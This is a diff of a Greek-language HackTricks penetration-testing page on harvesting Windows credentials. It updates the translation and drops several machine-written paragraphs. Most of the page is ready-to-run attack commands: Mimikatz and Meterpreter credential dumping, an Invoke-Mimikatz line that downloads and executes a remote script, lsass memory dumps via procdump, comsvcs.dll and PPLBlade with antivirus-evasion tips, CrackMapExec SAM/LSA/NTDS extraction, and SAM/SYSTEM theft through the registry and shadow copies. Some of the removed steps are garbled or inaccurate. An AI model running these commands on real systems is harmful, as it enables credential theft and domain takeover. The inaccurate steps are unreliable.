@@ -2,19 +2,19 @@
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε AWS hacking από το μηδέν με</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
+Άλλοι τρόποι να υποστηρίξετε το HackTricks:
 
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή **να κατεβάσετε το HackTricks σε PDF** Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή την [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.
 
 </details>
 
-## Κλοπή Διαπιστευτηρίων Mimikatz
+## Credentials Mimikatz
 ```bash
 #Elevate Privileges to extract the credentials
 privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
@@ -28,7 +28,7 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**Βρείτε άλλες λειτουργίες που μπορεί να εκτελέσει το Mimikatz** [**εδώ**](credentials-mimikatz.md)**.**
+**Βρείτε άλλα πράγματα που μπορεί να κάνει το Mimikatz σε** [**αυτή τη σελίδα**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
 ```bash
@@ -36,11 +36,11 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Μάθετε για μερικές πιθανές προστασίες διαπιστευτηρίων εδώ.**](credentials-protections.md) **Αυτές οι προστασίες μπορούν να εμποδίσουν το Mimikatz από την εξαγωγή ορισμένων διαπιστευτηρίων.**
+[**Μάθετε για ορισμένες πιθανές προστασίες διαπιστευτηρίων εδώ.**](credentials-protections.md) **Αυτές οι προστασίες θα μπορούσαν να αποτρέψουν το Mimikatz από την εξαγωγή ορισμένων διαπιστευτηρίων.**
 
-## Διαπιστευτήρια με το Meterpreter
+## Διαπιστευτήρια με Meterpreter
 
-Χρησιμοποιήστε το [**Πρόσθετο Διαπιστευτηρίων**](https://github.com/carlospolop/MSF-Credentials) **που έχω δημιουργήσει για να αναζητήσετε κωδικούς πρόσβασης και κατακερματισμένα δεδομένα** μέσα στο θύμα.
+Χρησιμοποιήστε το [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **που** έχω δημιουργήσει για να **αναζητήσετε κωδικούς πρόσβασης και hashes** μέσα στο θύμα.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -57,14 +57,14 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
-## Παράκαμψη του AV
+## Παράκαμψη AV
 
 ### Procdump + Mimikatz
 
-Καθώς το **Procdump από** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**είναι ένα νόμιμο εργαλείο της Microsoft**, δεν ανιχνεύεται από τον Defender.\
-Μπορείτε να χρησιμοποιήσετε αυτό το εργαλείο για να **καταγράψετε τη διεργασία lsass**, **να κατεβάσετε την καταγραφή** και **να εξάγετε τα διαπιστευτήρια τοπικά** από την καταγραφή.
+Καθώς το **Procdump από** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **είναι ένα νόμιμο εργαλείο της Microsoft**, δεν ανιχνεύεται από το Defender.\
+Μπορείτε να χρησιμοποιήσετε αυτό το εργαλείο για να **κάνετε dump τη διαδικασία lsass**, **να κατεβάσετε το dump** και **να εξάγετε** τα **διαπιστευτήρια τοπικά** από το dump.
 
-{% code title="Καταγραφή του lsass" %}
+{% code title="Dump lsass" %}
 ```bash
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
@@ -72,7 +72,11 @@ C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
-{% code title="Εξαγωγή διαπιστευτηρίων από το dump" %}
+{% endcode %}
+
+{% code title="Extract credentials from the dump" %}
+
+{% endcode %}
 ```c
 //Load the dump
 mimikatz # sekurlsa::minidump lsass.dmp
@@ -83,44 +87,44 @@ mimikatz # sekurlsa::logonPasswords
 
 Αυτή η διαδικασία γίνεται αυτόματα με το [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Σημείωση**: Ορισμένα **AV** μπορεί να ανιχνεύσουν ως κακόβουλη τη χρήση του **procdump.exe για να κατεβάσει το lsass.exe**, αυτό συμβαίνει επειδή ανιχνεύουν τις συμβολοσειρές **"procdump.exe" και "lsass.exe"**. Επομένως, είναι πιο αόρατο να περάσετε ως **όρισμα** το **PID** του lsass.exe στο procdump **αντί για** το όνομα lsass.exe.
+**Σημείωση**: Κάποια **AV** μπορεί να **ανιχνεύσουν** ως **κακόβουλη** τη χρήση του **procdump.exe για την απόρριψη του lsass.exe**, αυτό συμβαίνει επειδή **ανιχνεύουν** τη συμβολοσειρά **"procdump.exe" και "lsass.exe"**. Έτσι είναι **πιο διακριτικό** να **περάσετε** ως **παράμετρο** το **PID** του lsass.exe στο procdump **αντί για** το **όνομα lsass.exe.**
 
-### Κατεβάζοντας το lsass με το **comsvcs.dll**
+### Απόρριψη του lsass με **comsvcs.dll**
 
-Ένα DLL με το όνομα **comsvcs.dll** που βρίσκεται στο `C:\Windows\System32` είναι υπεύθυνο για το **κατέβασμα της μνήμης διεργασίας** σε περίπτωση κατάρρευσης. Αυτό το DLL περιλαμβάνει μια **συνάρτηση** με το όνομα **`MiniDumpW`**, σχεδιασμένη να κληθεί χρησιμοποιώντας το `rundll32.exe`.\
-Δεν έχει σημασία να χρησιμοποιηθούν τα πρώτα δύο ορίσματα, αλλά το τρίτο χωρίζεται σε τρία μέρη. Το πρώτο μέρος αποτελείται από το αναγνωριστικό της διεργασίας που θα κατεβαστεί, το δεύτερο μέρος αντιπροσωπεύει την τοποθεσία του αρχείου κατεβάσματος και το τρίτο μέρος είναι αυστηρά η λέξη **full**. Δεν υπάρχουν εναλλακτικές επιλογές.\
-Μετά την ανάλυση αυτών των τριών μερών, το DLL αρχίζει να δημιουργεί το αρχείο κατεβάσματος και να μεταφέρει τη μνήμη της καθορισμένης διεργασίας σε αυτό το αρχείο.\
-Η χρήση του **comsvcs.dll** είναι εφικτή για το κατέβασμα της διεργασίας lsass, εξαλείφοντας έτσι την ανάγκη για μεταφόρτωση και εκτέλεση του procdump. Αυτή η μέθοδος περιγράφεται αναλυτικά στο [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+Μια DLL με το όνομα **comsvcs.dll** που βρίσκεται στο `C:\Windows\System32` είναι υπεύθυνη για την **απόρριψη της μνήμης της διαδικασίας** σε περίπτωση σφάλματος. Αυτή η DLL περιλαμβάνει μια **συνάρτηση** με το όνομα **`MiniDumpW`**, σχεδιασμένη να καλείται χρησιμοποιώντας το `rundll32.exe`.\
+Είναι άσχετο να χρησιμοποιήσετε τα πρώτα δύο επιχειρήματα, αλλά το τρίτο χωρίζεται σε τρία μέρη. Το αναγνωριστικό της διαδικασίας που θα απορριφθεί αποτελεί το πρώτο μέρος, η τοποθεσία του αρχείου απόρριψης αντιπροσωπεύει το δεύτερο, και το τρίτο μέρος είναι αυστηρά η λέξη **full**. Δεν υπάρχουν εναλλακτικές επιλογές.\
+Μετά την ανάλυση αυτών των τριών μερών, η DLL εμπλέκεται στη δημιουργία του αρχείου απόρριψης και στη μεταφορά της μνήμης της συγκεκριμένης διαδικασίας σε αυτό το αρχείο.\
+Η χρήση της **comsvcs.dll** είναι εφικτή για την απόρριψη της διαδικασίας lsass, εξαλείφοντας έτσι την ανάγκη για μεταφόρτωση και εκτέλεση του procdump. Αυτή η μέθοδος περιγράφεται λεπτομερώς στο [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
-Χρησιμοποιείται η παρακάτω εντολή για την εκτέλεση:
+Η ακόλουθη εντολή χρησιμοποιείται για την εκτέλεση:
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
-**Μπορείτε να αυτοματοποιήσετε αυτήν τη διαδικασία με το** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
+**Μπορείτε να αυτοματοποιήσετε αυτή τη διαδικασία με το** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
 
-### **Αποθήκευση του lsass με το Task Manager**
+### **Απόρριψη του lsass με το Task Manager**
 
-1. Δεξί κλικ στη γραμμή εργασιών και κάντε κλικ στο Task Manager
+1. Κάντε δεξί κλικ στη γραμμή εργασιών και επιλέξτε Task Manager
 2. Κάντε κλικ στο Περισσότερες λεπτομέρειες
-3. Αναζητήστε τη διεργασία "Local Security Authority Process" στην καρτέλα Διεργασίες
-4. Δεξί κλικ στη διεργασία "Local Security Authority Process" και κάντε κλικ στο "Δημιουργία αρχείου αποθήκευσης (dump)".
+3. Αναζητήστε τη διαδικασία "Local Security Authority Process" στην καρτέλα Διαδικασίες
+4. Κάντε δεξί κλικ στη διαδικασία "Local Security Authority Process" και επιλέξτε "Create dump file".
 
-### Αποθήκευση του lsass με το procdump
+### Απόρριψη του lsass με το procdump
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) είναι ένα υπογεγραμμένο από τη Microsoft δυαδικό αρχείο που αποτελεί μέρος του [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) συλλογής.
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) είναι ένα υπογεγραμμένο από τη Microsoft δυαδικό αρχείο που αποτελεί μέρος της σουίτας [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
-## Αποκτήστε πρόσβαση στο lsass με το PPLBlade
+## Dumpin lsass with PPLBlade
 
-Το [**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) είναι ένα εργαλείο για την αποκατάσταση Προστατευμένων Διεργασιών που υποστηρίζει την απόκρυψη του αρχείου αντιγράφου μνήμης και τη μεταφορά του σε απομακρυσμένους υπολογιστές χωρίς να το αποθηκεύει στον δίσκο.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) είναι ένα Εργαλείο Απόρριψης Προστατευμένων Διεργασιών που υποστηρίζει την απόκρυψη της απόρριψης μνήμης και τη μεταφορά της σε απομακρυσμένους σταθμούς εργασίας χωρίς να την αποθηκεύει στον δίσκο.
 
-**Βασικές λειτουργίες**:
+**Κύριες λειτουργίες**:
 
 1. Παράκαμψη της προστασίας PPL
-2. Απόκρυψη των αρχείων αντιγράφου μνήμης για να αποφευχθούν οι μηχανισμοί ανίχνευσης βάσει υπογραφής του Defender
-3. Μεταφόρτωση αρχείου αντιγράφου μνήμης με τις μεθόδους RAW και SMB χωρίς να το αποθηκεύσει στον δίσκο (αντιγραφή χωρίς αρχείο) 
+2. Απόκρυψη των αρχείων απόρριψης μνήμης για να αποφεύγονται οι μηχανισμοί ανίχνευσης με βάση τις υπογραφές του Defender
+3. Μεταφόρτωση της απόρριψης μνήμης με μεθόδους μεταφόρτωσης RAW και SMB χωρίς να την αποθηκεύει στον δίσκο (απόρριψη χωρίς αρχείο)
 
 {% code overflow="wrap" %}
 ```bash
@@ -130,140 +134,57 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 
 ## CrackMapExec
 
-### Αποκατάσταση των κατακερματισμένων τιμών του SAM
+### Dump SAM hashes
+
+### Απόρριψη κατακερματισμών SAM
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
-### Αποκατάσταση μυστικών LSA
-
-Η αποκατάσταση των μυστικών LSA είναι μια τεχνική που χρησιμοποιείται για την ανάκτηση διαπιστευτηρίων από τον τοπικό αποθηκευτή LSA (Local Security Authority) σε ένα σύστημα Windows. Τα μυστικά LSA περιέχουν ευαίσθητες πληροφορίες, όπως κωδικούς πρόσβασης και πιστοποιητικά, που χρησιμοποιούνται από το σύστημα για την αυθεντικοποίηση χρηστών και εφαρμογών.
-
-Για να αποκτήσουμε πρόσβαση στα μυστικά LSA, χρησιμοποιούμε το εργαλείο `lsadump` που παρέχεται από το πλαίσιο εργαλείων Impacket. Αυτό το εργαλείο μας επιτρέπει να ανακτήσουμε τα μυστικά LSA από το αρχείο αποθήκευσης τους στο σύστημα.
-
-Για να εκτελέσουμε την αποκατάσταση των μυστικών LSA, ακολουθούμε τα παρακάτω βήματα:
-
-1. Εγκαθιστούμε το πλαίσιο εργαλείων Impacket στο σύστημά μας.
-2. Εκτελούμε την εντολή `lsadump` με τις κατάλληλες παραμέτρους για να ανακτήσουμε τα μυστικά LSA.
-3. Αναλύουμε τα αποτελέσματα για να εξάγουμε τα διαπιστευτήρια που χρειαζόμαστε.
-
-Με αυτόν τον τρόπο, μπορούμε να αποκτήσουμε πρόσβαση σε ευαίσθητες πληροφορίες που αποθηκεύονται στα μυστικά LSA του συστήματος Windows. Είναι σημαντικό να σημειωθεί ότι αυτή η τεχνική πρέπει να χρησιμοποιείται μόνο για νόμιμους σκοπούς, όπως την ασφάλεια του συστήματος και την αποκατάσταση χαμένων διαπιστευτηρίων.
+### Απόρριψη μυστικών LSA
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### Αντλήστε το NTDS.dit από τον στόχο DC
-
-To dump the NTDS.dit file from a target Domain Controller (DC), you can use various techniques. Here are a few methods:
-
-#### Method 1: Using ntdsutil
-1. Open a command prompt with administrative privileges on your attacker machine.
-2. Run the following command to open the ntdsutil tool:
-```
-ntdsutil
-```
-3. Inside the ntdsutil tool, run the following commands:
-```
-activate instance ntds
-ifm
-create full C:\path\to\output\folder
-```
-Replace `C:\path\to\output\folder` with the desired path where you want to save the NTDS.dit file.
-4. Exit the ntdsutil tool by running the following command:
-```
-quit
-```
-5. The NTDS.dit file will be saved in the specified output folder.
-
-#### Method 2: Using secretsdump.py
-1. Download the `secretsdump.py` script from the Impacket repository.
-2. Open a command prompt with administrative privileges on your attacker machine.
-3. Run the following command to dump the NTDS.dit file:
-```
-python secretsdump.py -just-dc-ntlm <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_DC_IP>
-```
-Replace `<DOMAIN>`, `<USERNAME>`, `<PASSWORD>`, and `<TARGET_DC_IP>` with the appropriate values.
-4. The NTDS.dit file will be dumped and displayed in the command prompt.
-
-#### Method 3: Using Mimikatz
-1. Download the Mimikatz tool from the official repository.
-2. Open a command prompt with administrative privileges on your attacker machine.
-3. Run the following command to load the Mimikatz module:
-```
-mimikatz
-```
-4. Inside the Mimikatz tool, run the following commands:
-```
-lsadump::lsa /inject /name:ntds
-lsadump::dcsync /domain:<DOMAIN> /all /csv
-```
-Replace `<DOMAIN>` with the target domain name.
-5. The NTDS.dit file will be dumped and saved in the current directory.
-
-Remember to use these techniques responsibly and only on authorized systems.
+### Απόρριψη του NTDS.dit από τον στόχο DC
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Ανάκτηση ιστορικού κωδικών NTDS.dit από τον στόχο DC
-
-Για να ανακτήσετε το ιστορικό κωδικών NTDS.dit από έναν στόχο DC, μπορείτε να ακολουθήσετε τα παρακάτω βήματα:
-
-1. Εκτελέστε το εργαλείο `ntdsutil` στον στόχο DC.
-2. Εισάγετε την εντολή `activate instance ntds`.
-3. Εισάγετε την εντολή `ifm`.
-4. Επιλέξτε τον φάκελο προορισμού για την εξαγωγή των αρχείων NTDS.dit.
-5. Αντιγράψτε τα αρχεία NTDS.dit και NTDS.dit.log από τον φάκελο προορισμού στον υπολογιστή σας.
-
-Με αυτόν τον τρόπο, θα έχετε αντίγραφα των αρχείων NTDS.dit και NTDS.dit.log από τον στόχο DC, τα οποία περιέχουν το ιστορικό κωδικών που μπορείτε να αναλύσετε για περαιτέρω ανάλυση και εκμετάλλευση.
+### Απόρριψη του ιστορικού κωδικών πρόσβασης NTDS.dit από τον στόχο DC
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
 ### Εμφάνιση του χαρακτηριστικού pwdLastSet για κάθε λογαριασμό NTDS.dit
-
-Για να εμφανίσετε το χαρακτηριστικό pwdLastSet για κάθε λογαριασμό στο αρχείο NTDS.dit, μπορείτε να ακολουθήσετε τα παρακάτω βήματα:
-
-1. Ανοίξτε μια κονσόλα εντολών.
-2. Εκτελέστε την εντολή `ntdsutil` για να ανοίξετε το εργαλείο NTDSUtil.
-3. Εκτελέστε την εντολή `activate instance ntds` για να ενεργοποιήσετε την ενότητα NTDS.
-4. Εκτελέστε την εντολή `ifm` για να μεταβείτε στη λειτουργία IFM (Install From Media).
-5. Εκτελέστε την εντολή `create full <path>` για να δημιουργήσετε ένα πλήρες αντίγραφο ασφαλείας του NTDS.dit σε έναν καθορισμένο φάκελο.
-6. Μεταβείτε στον φάκελο όπου δημιουργήθηκε το αντίγραφο ασφαλείας του NTDS.dit.
-7. Εκτελέστε την εντολή `esentutl /p ntds.dit` για να επισκευάσετε το αρχείο NTDS.dit.
-8. Εκτελέστε την εντολή `ntdsutil` για να ανοίξετε ξανά το εργαλείο NTDSUtil.
-9. Εκτελέστε την εντολή `activate instance ntds` για να ενεργοποιήσετε την ενότητα NTDS.
-10. Εκτελέστε την εντολή `semantic database analysis` για να αναλύσετε τη σημασιολογική βάση δεδομένων.
-11. Εκτελέστε την εντολή `go` για να ξεκινήσει η ανάλυση.
-12. Αφού ολοκληρωθεί η ανάλυση, θα εμφανιστεί η λίστα των λογαριασμών NTDS.dit με το χαρακτηριστικό pwdLastSet για καθέναν από αυτούς.
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
-## Κλοπή των αρχείων SAM & SYSTEM
+## Κλοπή SAM & SYSTEM
 
-Αυτά τα αρχεία πρέπει να βρίσκονται στο _C:\windows\system32\config\SAM_ και _C:\windows\system32\config\SYSTEM._ Ωστόσο, **δεν μπορείτε απλά να τα αντιγράψετε με τον συνηθισμένο τρόπο** επειδή είναι προστατευμένα.
+Αυτά τα αρχεία πρέπει να **βρίσκονται** στο _C:\windows\system32\config\SAM_ και _C:\windows\system32\config\SYSTEM._ Αλλά **δεν μπορείτε απλά να τα αντιγράψετε με κανονικό τρόπο** επειδή είναι προστατευμένα.
 
-### Από το Μητρώο (Registry)
+### Από το Μητρώο
 
-Ο ευκολότερος τρόπος για να κλέψετε αυτά τα αρχεία είναι να πάρετε ένα αντίγραφο από το μητρώο (registry):
+Ο ευκολότερος τρόπος να κλέψετε αυτά τα αρχεία είναι να πάρετε ένα αντίγραφο από το μητρώο:
 ```
 reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-**Κατεβάστε** αυτά τα αρχεία στη μηχανή σας Kali και **εξαγάγετε τις κατακερματισμένες τιμές** χρησιμοποιώντας:
+**Κατεβάστε** αυτά τα αρχεία στη μηχανή Kali σας και **εξαγάγετε τα hashes** χρησιμοποιώντας:
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
-### Αντίγραφο Σκιών Όγκου
+### Volume Shadow Copy
 
-Μπορείτε να πραγματοποιήσετε αντίγραφο των προστατευμένων αρχείων χρησιμοποιώντας αυτήν την υπηρεσία. Χρειάζεστε να είστε Διαχειριστής.
+Μπορείτε να κάνετε αντιγραφή προστατευμένων αρχείων χρησιμοποιώντας αυτή την υπηρεσία. Πρέπει να είστε Διαχειριστής.
 
-#### Χρήση του vssadmin
+#### Χρησιμοποιώντας vssadmin
 
-Το δυαδικό αρχείο vssadmin είναι διαθέσιμο μόνο στις εκδόσεις των Windows Server.
+Το vssadmin binary είναι διαθέσιμο μόνο στις εκδόσεις Windows Server.
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
 #Copy SYSTEM
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
 #Copy ntds.dit
@@ -272,7 +193,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Αλλά μπορείτε να κάνετε το ίδιο από το **Powershell**. Αυτό είναι ένα παράδειγμα **πώς να αντιγράψετε το αρχείο SAM** (η σκληρή δίσκος που χρησιμοποιείται είναι ο "C:" και αποθηκεύεται στο C:\users\Public), αλλά μπορείτε να χρησιμοποιήσετε αυτό για να αντιγράψετε οποιοδήποτε προστατευμένο αρχείο:
+Αλλά μπορείτε να κάνετε το ίδιο από **Powershell**. Αυτό είναι ένα παράδειγμα **πώς να αντιγράψετε το αρχείο SAM** (ο σκληρός δίσκος που χρησιμοποιείται είναι "C:" και αποθηκεύεται στο C:\users\Public) αλλά μπορείτε να το χρησιμοποιήσετε για την αντιγραφή οποιουδήποτε προστατευμένου αρχείου:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -281,37 +202,35 @@ $volume=(gwmi win32_shadowcopy -filter "ID='$id'")
 cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
 $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
-Κώδικας από το βιβλίο: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
-
 ### Invoke-NinjaCopy
 
-Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) για να δημιουργήσετε αντίγραφο των αρχείων SAM, SYSTEM και ntds.dit.
+Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) για να κάνετε ένα αντίγραφο των SAM, SYSTEM και ntds.dit.
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
-## **Διαπιστευτήρια Active Directory - NTDS.dit**
+## **Active Directory Credentials - NTDS.dit**
 
-Το αρχείο **NTDS.dit** είναι γνωστό ως η καρδιά του **Active Directory**, καθώς περιέχει κρίσιμα δεδομένα σχετικά με αντικείμενα χρηστών, ομάδες και την συμμετοχή τους. Εδώ αποθηκεύονται οι **κατακερματισμένες κωδικές λέξεις πρόσβασης** για τους χρήστες του τομέα. Αυτό το αρχείο είναι μια βάση δεδομένων **Extensible Storage Engine (ESE)** και βρίσκεται στη διαδρομή **_%SystemRoom%/NTDS/ntds.dit_**.
+Το αρχείο **NTDS.dit** είναι γνωστό ως η καρδιά του **Active Directory**, καθώς περιέχει κρίσιμα δεδομένα για αντικείμενα χρηστών, ομάδες και τις συμμετοχές τους. Εδώ αποθηκεύονται οι **κωδικοί πρόσβασης** των χρηστών του τομέα. Αυτό το αρχείο είναι μια βάση δεδομένων **Extensible Storage Engine (ESE)** και βρίσκεται στο **_%SystemRoom%/NTDS/ntds.dit_**.
 
-Μέσα σε αυτήν τη βάση δεδομένων, διατηρούνται τρεις κύριοι πίνακες:
+Μέσα σε αυτή τη βάση δεδομένων, διατηρούνται τρεις κύριοι πίνακες:
 
-- **Πίνακας Δεδομένων**: Αυτός ο πίνακας αποθηκεύει λεπτομέρειες σχετικά με αντικείμενα όπως χρήστες και ομάδες.
-- **Πίνακας Συνδέσεων**: Διατηρεί τις σχέσεις, όπως τη συμμετοχή σε ομάδες.
-- **Πίνακας SD**: Εδώ αποθηκεύονται οι **ασφαλείς περιγραφές** για κάθε αντικείμενο, εξασφαλίζοντας την ασφάλεια και τον έλεγχο πρόσβασης για τα αποθηκευμένα αντικείμενα.
+- **Data Table**: Αυτός ο πίνακας αποθηκεύει λεπτομέρειες για αντικείμενα όπως χρήστες και ομάδες.
+- **Link Table**: Παρακολουθεί τις σχέσεις, όπως τις συμμετοχές σε ομάδες.
+- **SD Table**: Εδώ αποθηκεύονται οι **περιγραφείς ασφαλείας** για κάθε αντικείμενο, διασφαλίζοντας την ασφάλεια και τον έλεγχο πρόσβασης για τα αποθηκευμένα αντικείμενα.
 
 Περισσότερες πληροφορίες για αυτό: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Τα Windows χρησιμοποιούν το _Ntdsa.dll_ για να αλληλεπιδράσουν με αυτό το αρχείο και χρησιμοποιείται από το _lsass.exe_. Έτσι, μέρος του αρχείου **NTDS.dit** μπορεί να βρίσκεται **μέσα στη μνήμη του `lsass`** (μπορείτε να βρείτε τα πιο πρόσφατα προσπελασμένα δεδομένα πιθανότατα λόγω της βελτίωσης της απόδοσης με τη χρήση μιας **μνήμης cache**).
+Τα Windows χρησιμοποιούν _Ntdsa.dll_ για να αλληλεπιδρούν με αυτό το αρχείο και χρησιμοποιείται από το _lsass.exe_. Έτσι, **μέρος** του αρχείου **NTDS.dit** μπορεί να βρίσκεται **μέσα στη μνήμη του `lsass`** (μπορείτε να βρείτε τα τελευταία προσπελασμένα δεδομένα πιθανώς λόγω της βελτίωσης της απόδοσης με τη χρήση μιας **cache**).
 
-#### Αποκρυπτογράφηση των κατακερματισμένων λέξεων πρόσβασης μέσα στο NTDS.dit
+#### Αποκρυπτογράφηση των hashes μέσα στο NTDS.dit
 
-Ο κατακερματισμένος κωδικός λέξης πρόσβασης κρυπτογραφείται 3 φορές:
+Το hash είναι κρυπτογραφημένο 3 φορές:
 
-1. Αποκρυπτογράφηση του Κλειδιού Κρυπτογράφησης Κωδικού Πρόσβασης (**PEK**) χρησιμοποιώντας το **BOOTKEY** και το **RC4**.
-2. Αποκρυπτογράφηση του **κατακερματισμένου κωδικού** χρησιμοποιώντας το **PEK** και το **RC4**.
-3. Αποκρυπτογράφηση του **κατακερματισμένου κωδικού** χρησιμοποιώντας το **DES**.
+1. Αποκρυπτογράφηση του Password Encryption Key (**PEK**) χρησιμοποιώντας το **BOOTKEY** και το **RC4**.
+2. Αποκρυπτογράφηση του **hash** χρησιμοποιώντας το **PEK** και το **RC4**.
+3. Αποκρυπτογράφηση του **hash** χρησιμοποιώντας το **DES**.
 
